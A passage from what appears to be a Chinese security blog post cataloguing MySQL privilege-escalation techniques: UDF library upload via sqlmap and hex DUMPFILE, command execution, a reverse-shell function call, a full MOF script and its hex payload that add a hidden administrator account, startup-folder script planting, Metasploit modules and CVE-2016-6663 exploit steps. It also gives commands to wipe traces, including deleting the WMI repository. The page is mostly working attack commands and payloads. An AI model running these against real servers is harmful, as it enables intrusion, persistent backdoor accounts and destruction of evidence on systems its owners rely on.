+</span><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">plugin_dir</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">plugin</span><span class="o">/</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">+</span><span class="c1">---------------+------------------------------+
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>技巧<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>在 windows 下可以利用 NTFS 流来创建该文件夹：</p>
+<p><code>select 233 into dumpfile 'C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation';</code></p>
+</div>
+        </div>
+    </div>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>技巧<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>如何找到 mysql 的安装目录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">basedir</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="o">+</span><span class="c1">------------------+
+</span><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="o">@@</span><span class="n">basedir</span><span class="w">        </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">+</span><span class="c1">------------------+
+</span><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">mysql</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span><span class="w"></span><span class="o">+</span><span class="c1">------------------+
+</span></code></pre></td></tr></table>
+</div>
+</div></div>
+        </div>
+    </div>
+<h4 id="213-写入动态链接库">2.1.3 写入动态链接库</h4>
+<p>SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sqlmap -u <span class="s2">&#34;http://localhost/&#34;</span> --data<span class="o">=</span><span class="s2">&#34;id=1&#34;</span> --file-write<span class="o">=</span><span class="s2">&#34;/path/to/lib_mysqludf_sys_64.so&#34;</span> --file-dest<span class="o">=</span><span class="s2">&#34;/usr/lib/mysql/plugin/udf.so&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>如果没有注入的话，我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，可以通过手工写文件到 plugin 目录下的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span><span class="w"> </span><span class="err">直接</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="err">查询十六进制写入</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="mi">0</span><span class="n">x7f454c4602</span><span class="p">...</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">DUMPFILE</span><span class="w"> </span><span class="s1">&#39;/usr/lib/mysql/plugin/udf.so&#39;</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>这里的十六进制怎么获取呢？可以利用 MySQL 自带的 hex 函数来编码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span><span class="w"> </span><span class="err">直接传入路径编码</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/lib_mysqludf_sys_64.so&#39;</span><span class="p">));</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">也可以将路径</span><span class="w"> </span><span class="n">hex</span><span class="w"> </span><span class="err">编码</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="mi">0</span><span class="n">x2f6c69625f6d7973716c7564665f7379735f36342e736f</span><span class="p">));</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="214-命令执行">2.1.4 命令执行</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="n">sys_eval</span><span class="w"> </span><span class="k">RETURNS</span><span class="w"> </span><span class="n">STRING</span><span class="w"> </span><span class="n">SONAME</span><span class="w"> </span><span class="s1">&#39;udf.dll&#39;</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">sys_eval</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="215-清理痕迹">2.1.5 清理痕迹</h4>
+<p>删除自定义函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">drop</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">sys_eval</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="22-自动化实现">2.2 自动化实现</h3>
+<p>msf 中的模块：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; <span class="nb">set</span> payload linux/x86/shell/bind_tcp
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="23-udf-shell">2.3 UDF Shell</h3>
+<p>假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了。</p>
+<h4 id="231-udfphp">2.3.1 UDF.PHP</h4>
+<p>UDF 命令执行大马：<a href="https://github.com/echohun/tools/blob/master/%e5%a4%a7%e9%a9%ac/udf.php" target="_blank" rel="noopener noreffer">https://github.com/echohun/tools/blob/master/大马/udf.php</a></p>
+<h4 id="232-navicat-mysql">2.3.2 Navicat MySQL</h4>
+<p>目标 MySQL 不允许外连，这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113137.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113137.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113137.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113137.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113137.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113137.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113221.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113221.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113221.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113221.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113221.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113221.png-water_print" /></p>
+<p>接着连接的时候设置 HTTP 通道：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113326.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113326.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113326.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113326.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113326.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119113326.png-water_print" /></p>
+<p>连接成功后就可以进行上述手工 UDF 提权步骤。</p>
+<h3 id="24-反弹端口提权">2.4 反弹端口提权</h3>
+<p>实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cmdshell        <span class="c1"># 执行cmd</span>
+downloader      <span class="c1"># 下载者,到网上下载指定文件并保存到指定目录</span>
+open3389        <span class="c1"># 通用开3389终端服务,可指定端口(不改端口无需重启)</span>
+backshell       <span class="c1"># 反弹Shell</span>
+ProcessView     <span class="c1"># 枚举系统进程</span>
+KillProcess     <span class="c1"># 终止指定进程</span>
+regread         <span class="c1"># 读注册表</span>
+regwrite        <span class="c1"># 写注册表</span>
+shut            <span class="c1"># 关机,注销,重启</span>
+about           <span class="c1"># 说明与帮助函数</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>地址：<a href="https://github.com/Geekby/langouster_udf" target="_blank" rel="noopener noreffer">https://github.com/Geekby/langouster_udf</a></p>
+<p>首先在攻击机上开启 NC 监听，然后目标机器上导入 dll 动态链接库，然后创建自定义函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="n">backshell</span><span class="w"> </span><span class="k">RETURNS</span><span class="w"> </span><span class="n">STRING</span><span class="w"> </span><span class="n">SONAME</span><span class="w"> </span><span class="s1">&#39;udf.dll&#39;</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>直接反弹 shell ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="n">backshell</span><span class="p">(</span><span class="s2">&#34;IP&#34;</span><span class="p">,</span><span class="w"> </span><span class="mi">4444</span><span class="p">);</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="3-mof-提权">3 MOF 提权</h2>
+<p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。</p>
+<h3 id="31-原理">3.1 原理</h3>
+<p>提权的原理是 <code>C:/Windows/system32/wbem/mof/</code> 目录下的 mof 文件每隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
+<h3 id="32-手动复现">3.2 手动复现</h3>
+<h4 id="321-上传-mof-文件">3.2.1 上传 mof 文件</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#pragma namespace(&#34;\\\\.\\root\\subscription&#34;) 
+
+instance of __EventFilter as $EventFilter 
+{ 
+    EventNamespace = &#34;Root\\Cimv2&#34;; 
+    Name  = &#34;filtP2&#34;; 
+    Query = &#34;Select * From __InstanceModificationEvent &#34; 
+            &#34;Where TargetInstance Isa \&#34;Win32_LocalTime\&#34; &#34; 
+            &#34;And TargetInstance.Second = 5&#34;; 
+    QueryLanguage = &#34;WQL&#34;; 
+}; 
+
+instance of ActiveScriptEventConsumer as $Consumer 
+{ 
+    Name = &#34;consPCSV2&#34;; 
+    ScriptingEngine = &#34;JScript&#34;; 
+    ScriptText = 
+&#34;var WSH = new ActiveXObject(\&#34;WScript.Shell\&#34;)\nWSH.run(\&#34;net.exe user hacker P@ssw0rd /add\&#34;)\nWSH.run(\&#34;net.exe localgroup administrators hacker /add\&#34;)&#34;; 
+}; 
+
+instance of __FilterToConsumerBinding 
+{ 
+    Consumer   = $Consumer; 
+    Filter = $EventFilter; 
+};
+</code></pre></td></tr></table>
+</div>
+</div><p>利用 MySQL 写文件的特性将这个 MOF 文件导入到 <code>C:/Windows/system32/wbem/mof/</code> 目录下，依然采用上述编码的方式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="mi">0</span><span class="n">x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s2">&#34;C:/windows/system32/wbem/mof/test.mof&#34;</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="322-痕迹清理">3.2.2 痕迹清理</h4>
+<p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 停止 winmgmt 服务</span>
+net stop winmgmt
+
+<span class="c1"># 删除 Repository 文件夹</span>
+rmdir /s /q C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>bem<span class="se">\R</span>epository<span class="se">\
+</span><span class="se"></span>
+<span class="c1"># 手动删除 mof 文件</span>
+del C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>bem<span class="se">\m</span>of<span class="se">\g</span>ood<span class="se">\t</span>est.mof /F /S
+
+<span class="c1"># 删除创建的用户</span>
+net user hacker /delete
+
+<span class="c1"># 重新启动服务</span>
+net start winmgmt
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="33-自动化实现">3.3 自动化实现</h3>
+<p>MSF 里面自带了 MOF 提权模块：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/windows/mysql/mysql_mof
+<span class="c1"># 设置好自己的 payload</span>
+msf6 &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+
+<span class="c1"># 设置目标 MySQL 的基础信息</span>
+msf6 &gt; <span class="nb">set</span> rhosts 192.168.102.1
+msf6 &gt; <span class="nb">set</span> username root
+msf6 &gt; <span class="nb">set</span> password root
+msf6 &gt; run
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="4-启动项提权">4 启动项提权</h2>
+<p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p>
+<h3 id="41-启动项路径">4.1 启动项路径</h3>
+<ul>
+<li><strong>Windows Server 2003</strong> 的启动项路径：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 中文系统</span>
+C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\「</span>开始」菜单<span class="se">\程</span>序<span class="se">\启</span>动
+C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>ll Users<span class="se">\「</span>开始」菜单<span class="se">\程</span>序<span class="se">\启</span>动
+
+<span class="c1"># 英文系统</span>
+C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
+C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>ll Users<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
+
+<span class="c1"># 开关机项 需要自己建立对应文件夹</span>
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\G</span>roupPolicy<span class="se">\M</span>achine<span class="se">\S</span>cripts<span class="se">\S</span>tartup
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\G</span>roupPolicy<span class="se">\M</span>achine<span class="se">\S</span>cripts<span class="se">\S</span>hutdown
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>Windows Server 2008</strong> 的启动项路径：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
+C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="42-写入文件">4.2 写入文件</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="mi">0</span><span class="n">x</span><span class="p">...</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s2">&#34;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&#34;</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</p>
+<h3 id="42-msf-自动化实现">4.2 MSF 自动化实现</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/windows/mysql/mysql_start_up
+</code></pre></td></tr></table>
+</div>
+</div><div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">STARTUP_FOLDER 启动项文件夹得自己根据实际的目标系统来进行调整</div>
+        </div>
+    </div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119120408.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119120408.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119120408.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119120408.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119120408.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210119120408.png-water_print" /></p>
+<h2 id="4-cve-2016-6663">4 CVE-2016-6663</h2>
+<h3 id="41-原理">4.1 原理</h3>
+<p>竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限</p>
+<p>条件：</p>
+<ol>
+<li>Getshell 拿到 www-data 权限</li>
+<li>拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户</li>
+<li>关键提取步骤需要在交互环境下，所以需要反弹 shell</li>
+<li>MySQL 版本需要 &lt;= 5.5.51 或 5.6.x &lt;= 5.6.32 或 5.7.x &lt;= 5.7.14 或 8.x &lt; 8.0.1</li>
+<li>MariaDB 版本需要 &lt;= 5.5.51 或 10.0.x &lt;= 10.0.27 或 10.1.x &lt;= 10.1.17</li>
+</ol>
+<p>Exp：<a href="https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html" target="_blank" rel="noopener noreffer">https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</a></p>
+<p>在反弹的 shell  中，编译 payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
+</code></pre></td></tr></table>
+</div>
+</div><p>执行 EXP 提权：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库</span>
+./mysql-privesc-race <span class="nb">test</span> <span class="m">123456</span> localhost <span class="nb">test</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>参考：</p>
+<ul>
+<li>
+<p><a href="http://next.uuzdaisuki.com/2018/07/02/mysql%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83%e6%80%bb%e7%bb%93/" target="_blank" rel="noopener noreffer">http://next.uuzdaisuki.com/2018/07/02/mysql数据库提权总结/</a></p>
+</li>
+<li>
+<p><a href="https://www.sqlsec.com/2020/11/mysql.html" target="_blank" rel="noopener noreffer">https://www.sqlsec.com/2020/11/mysql.html</a></p>
+</li>
+<li>
+<p><a href="https://xz.aliyun.com/t/1122" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/1122</a></p>
+</li>
+<li>
+<p><a href="https://blog.csdn.net/kclax/article/details/91515105?utm_medium=distribute.pc_relevant.none-task-blog-title-7&amp;spm=1001.2101.3001.4242" target="_blank" rel="noopener noreffer">https://blog.csdn.net/kclax/article/details/91515105?utm_medium=distribute.pc_relevant.none-task-blog-title-7&amp;spm=1001.2101.3001.4242</a></p>
+</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-01-19</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" data-title="MySQL 提权方法整理"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" data-title="MySQL 提权方法整理"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" data-title="MySQL 提权方法整理"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
